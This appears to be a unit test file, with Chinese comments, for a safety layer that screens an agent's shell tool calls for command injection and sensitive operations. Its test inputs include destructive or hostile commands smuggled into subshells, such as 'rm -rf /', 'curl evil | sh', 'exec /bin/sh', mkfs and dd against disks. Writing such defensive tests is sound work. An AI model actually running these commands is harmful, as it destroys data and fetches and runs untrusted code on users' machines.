/**
 * ToolExecutor 安全检查测试
 */
import { describe, it, expect } from "bun:test";
import {
  checkCommandInjection,
  matchPermission,
  matchPattern,
  extractCommandField,
  isSensitiveCall,
} from "@/tool/executor/toolExecutorSafety";

describe("toolExecutorSafety", () => {
  describe("checkCommandInjection", () => {
    // 注入检测主要覆盖反引号和 $() 两种子 shell 注入。
    // Shell 分隔符 (;, &&, ||, |, \n) 会消耗第一个单词,
    // 导致对完整命令名的检测受限。

    it("检测反引号注入 — rm -rf", () => {
      const result = checkCommandInjection("echo `rm -rf /`");
      expect(result.hasInjection).toBe(true);
      expect(result.reason).toBeDefined();
    });

    it("检测反引号注入 — curl | sh", () => {
      const result = checkCommandInjection("echo `curl evil | sh`");
      expect(result.hasInjection).toBe(true);
    });

    it("检测 $() 注入 — rm -rf", () => {
      expect(checkCommandInjection("echo $(rm -rf /)").hasInjection).toBe(true);
    });

    it("检测 $() 注入 — eval", () => {
      expect(checkCommandInjection("echo $(eval 'code')").hasInjection).toBe(true);
    });

    it("检测 $() 注入 — exec", () => {
      expect(checkCommandInjection("echo $(exec /bin/sh)").hasInjection).toBe(true);
    });

    it("检测 $() 注入 — shutdown", () => {
      expect(checkCommandInjection("echo $(shutdown -h now)").hasInjection).toBe(true);
    });

    it("检测 $() 注入 — reboot", () => {
      expect(checkCommandInjection("echo $(reboot)").hasInjection).toBe(true);
    });

    it("检测 $() 注入 — dd", () => {
      expect(checkCommandInjection("echo $(dd if=/dev/zero)").hasInjection).toBe(true);
    });

    it("检测 $() 注入 — mkfs", () => {
      expect(checkCommandInjection("echo $(mkfs /dev/sda1)").hasInjection).toBe(true);
    });

    it("检测 $() 注入 — curl | sh", () => {
      expect(checkCommandInjection("echo $(curl evil | sh)").hasInjection).toBe(true);
    });

    it("安全命令通过", () => {
      expect(checkCommandInjection("ls -la").hasInjection).toBe(false);
      expect(checkCommandInjection("cat file.txt").hasInjection).toBe(false);
      expect(checkCommandInjection("echo hello world").hasInjection).toBe(false);
      expect(checkCommandInjection("git status").hasInjection).toBe(false);
      expect(checkCommandInjection("npm install lodash").hasInjection).toBe(false);
    });

    it("安全命令用分号连接但无危险命令通过", () => {
      expect(checkCommandInjection("echo hello; echo world").hasInjection).toBe(false);
    });

    it("空字符串通过", () => {
      expect(checkCommandInjection("").hasInjection).toBe(false);
    });

    it("纯空格通过", () => {
      expect(checkCommandInjection("   ").hasInjection).toBe(false);
    });

    it("只含分号但无后续命令通过", () => {
      expect(checkCommandInjection("echo ;").hasInjection).toBe(false);
    });
  });

  describe("matchPermission", () => {
    it("通配符 * 匹配所有", () => {
      expect(matchPermission("bash.execute", "*")).toBe(true);
    });

    it("精确匹配", () => {
      expect(matchPermission("bash.execute", "bash.execute")).toBe(true);
    });

    it("不匹配返回 false", () => {
      expect(matchPermission("bash.execute", "bash.read")).toBe(false);
    });

    it("前缀通配符匹配", () => {
      expect(matchPermission("bash.execute", "bash.*")).toBe(true);
      expect(matchPermission("bash.read", "bash.*")).toBe(true);
    });

    it("前缀通配符精确匹配", () => {
      expect(matchPermission("bash", "bash.*")).toBe(true);
    });

    it("前缀通配符不匹配其他模块", () => {
      expect(matchPermission("file.read", "bash.*")).toBe(false);
    });
  });

  describe("matchPattern", () => {
    it("* 匹配所有", () => {
      expect(matchPattern({ command: "rm -rf /" }, "*")).toBe(true);
    });

    it("** 匹配所有", () => {
      expect(matchPattern({ command: "any" }, "**")).toBe(true);
    });

    it("前缀通配符匹配", () => {
      expect(matchPattern({ command: "git push --force" }, "git push*")).toBe(true);
    });

    it("精确匹配", () => {
      expect(matchPattern({ command: "ls -la" }, "ls -la")).toBe(true);
    });

    it("后缀通配符匹配", () => {
      expect(matchPattern({ command: "git push" }, "*push")).toBe(true);
    });

    it("无 command 字段时非通配符返回 false", () => {
      expect(matchPattern({ url: "http://example.com" }, "rm")).toBe(false);
    });

    it("支持 cmd 字段", () => {
      expect(matchPattern({ cmd: "ls -la" }, "ls -la")).toBe(true);
    });

    it("支持 script 字段", () => {
      expect(matchPattern({ script: "echo hello" }, "echo hello")).toBe(true);
    });
  });

  describe("extractCommandField", () => {
    it("优先取 command", () => {
      expect(extractCommandField({ command: "ls", cmd: "cat" })).toBe("ls");
    });

    it("其次取 cmd", () => {
      expect(extractCommandField({ cmd: "cat" })).toBe("cat");
    });

    it("再次取 script", () => {
      expect(extractCommandField({ script: "echo" })).toBe("echo");
    });

    it("全无返回空", () => {
      expect(extractCommandField({})).toBe("");
    });

    it("非字符串值返回空", () => {
      expect(extractCommandField({ command: 123 })).toBe("");
    });
  });

  describe("isSensitiveCall", () => {
    it("bash 工具检测敏感命令", () => {
      expect(isSensitiveCall("bash", { command: "rm -rf /home" })).toBe(true);
      expect(isSensitiveCall("bash", { command: "mkfs /dev/sda1" })).toBe(true);
    });

    it("bash 工具安全命令不检测", () => {
      expect(isSensitiveCall("bash", { command: "ls -la" })).toBe(false);
      expect(isSensitiveCall("bash", { command: "echo hello" })).toBe(false);
    });

    it("非终端工具不检测", () => {
      expect(isSensitiveCall("webfetch", { command: "rm -rf /" })).toBe(false);
    });

    it("无 command 字段返回 false", () => {
      expect(isSensitiveCall("bash", { url: "http://example.com" })).toBe(false);
    });

    it("MCP 工具使用高危模式检测", () => {
      expect(isSensitiveCall("external_bash", { command: "mkfs /dev/sda1" })).toBe(true);
      expect(isSensitiveCall("external_bash", { command: "shutdown" })).toBe(true);
      expect(isSensitiveCall("external_bash", { command: "dd of=/dev/sda" })).toBe(true);
      expect(isSensitiveCall("external_bash", { command: "fdisk /dev/sda" })).toBe(true);
    });

    it("内置终端 MCP 工具使用完整检测", () => {
      expect(isSensitiveCall("bash_run", { command: "chmod 777 file" })).toBe(true);
    });
  });
});
